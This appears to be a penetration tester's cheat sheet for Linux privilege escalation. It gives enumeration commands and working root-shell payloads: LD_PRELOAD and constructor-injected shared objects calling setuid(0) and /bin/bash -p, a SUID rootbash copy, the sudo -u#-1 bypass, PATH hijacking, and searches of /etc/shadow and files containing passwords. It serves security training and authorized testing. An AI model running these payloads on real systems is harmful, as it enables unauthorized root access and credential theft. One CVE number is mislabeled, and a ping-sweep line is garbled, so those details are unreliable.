  
# Linux Host Enumeration   
## Checklists / What to look for
- [ ] Get a fully functional TTY  
- [ ] General host enum 
- [ ] Transfer files and run scripts 
- [ ] Exploitable sudo binaries or exploits  
- [ ] Exploitable cronjobs 
- [ ] SUID/SGID binaries  
- [ ] Services (running as root, only available to localhost)
- [ ] Passwords / config files 
- [ ] Binaries with exploitable capabilities 
- [ ] Is the kernel vulnerable  (last resort priv esc) 
- [ ] Further access into the network / post exploitation 

[Tiberius Linux Privilige Escalation](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux.rst)  

[PayloadAllTheThings Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  

## Quick Enumeration Commands  
    hostname; ip addr;    
    whoami; id   
    uname -r   
    cat /etc/passwd | grep /bin/bash   
    ls -l /etc/shadow  
    su -, su root (no password, root, password) 
    sudo -l  
    ps -aux | grep root 
    netstat -antp 
    
## File Transfer 
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    
## Scripts
run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 

 
    
## Upgrade to a fully functional TTY 
### Check 
    if [ -t 1 ] ; then echo terminal; else echo "not a terminal"; fi 
### Upgrade 
    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash') 
    /bin/sh -i 
    
[Gaining TTY](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst) 
[Breaking out of shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells) 
## Sudo exploits 
sudo -l, cat /etc/sudoers, check gtfobins  
sudo -V 
## Sudo LD_PRELOAD 
sudo -l, see env_keep+=LD_PRELOAD 

    #include <stdio.h> 
    #include <sys/types.h>
    #include <stdlib.h>
    void _init(){
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
    } 
    
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c 

sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 

## CVE-2019-14287 
sudo -l, see (ALL,!root)  

    sudo -u#-1 [binary escape]  
## CVE-2019-16634 
sudo su root, type password, see ******: passwd feedback enabled  

[proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634) 
## CVE-2021-3156 - Baron Samedit 
[proof of concept](https://github.com/stong/CVE-2021-3156) 

## Cronjobs    
look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 

    cat /etc/crontab  
    crontab -l    
    ls -al /etc/cron* 
## PATH variable 
If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
default /usr/bin:/bin 
    echo $PATH 
    cat /etc/crontab     
### Rootbash script 
    #!/bin/bash 
    cp /bin/bash /tmp/rootbash 
    chmod +s /tmp/rootbash 
### Wildcards 
[Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 

## SUID Binaries 
    overwrite binary, use gtfobins exploits, insert missing shared object, manipulate enviromental variables 
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null     
    find / -type f -a -perm -o+x -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null  
    
### Custom Executable
    int main(){
        setuid(0);
        system("/bin/bash -p");
    }  
### Shared Object Injection 
look for missing shared objects searched for in writable directories 
    strace [suid binary] 2>&1 | grep -iE “open|access|no such file” 
    [missing shared object].c 
    #include <stdio.h> 
    #include <stdlib.h> 
    static void inject() __attribute__((constructor));  
    void inject(){ 
     setuid(0); 
     system("/bin/bash -p"); 
    } 
    
    gcc -shared -fPIC -o [missing shared object].so [missing shared object].c 
    run suid binary 
### PATH Enviromental Variables 
SUID /SGID binary tries to execute another file without absolute path? -> change PATH var 
    strings [suid binary] 
    strace -v -f -e execve [suid binary] 2>&1 | grep exec 
    ltrace [suid binary]  
    
compile custom executable with name of file suid binary is calling
set PATH variable to current directory and run suid binary  

    PATH=.:$PATH /usr/local/bin/suid-env

### Misc SUID binaries 
    pkexec --user root /bin/sh  
    use binary to exec /bin/bash -p 
## Services Running as Root / Services Only Running Locally
    ps -aux | grep root 
    netstat -etulp 
    mysql running as root [exploit](https://www.exploit-db.com/exploits/1518)  
    ftp, telnet - tcpdump to sniff creds??
## Passwords / config files 
    find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
    /etc/passwd, /etc/shadow, /etc/sudoers  read or write?? 
    cat ~/.ssh  
## Capabilities 
check gtfobins, [capabilities reference](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) 
    getcap -r / 2>/dev/null  
    
## Kernel Exploits 
    uname -a  
    cat /etc/*-release
### Cross compile 
No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload 
    gcc -m32 -o output32 exploit.c     #(32 bit) 
    gcc -m64 -o output exploit.c       #(64 bit)  
    
## Further Access into a Network 
    netstat -antp; arp -a 
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
    cat /etc/hosts  
# Resources 
## Learn More 
[Hacktricks Linux Privilige Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation) 
[Local Priv Esc workshop](https://github.com/sagishahar/lpeworkshop) 
[A Guide to Linux Privilige Escalation](https://payatu.com/guide-linux-privilege-escalation)
[g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
[Linux elevation of privileges ToC](https://guif.re/linuxeop) 
[Linux Enumeration](https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/enumeration) 

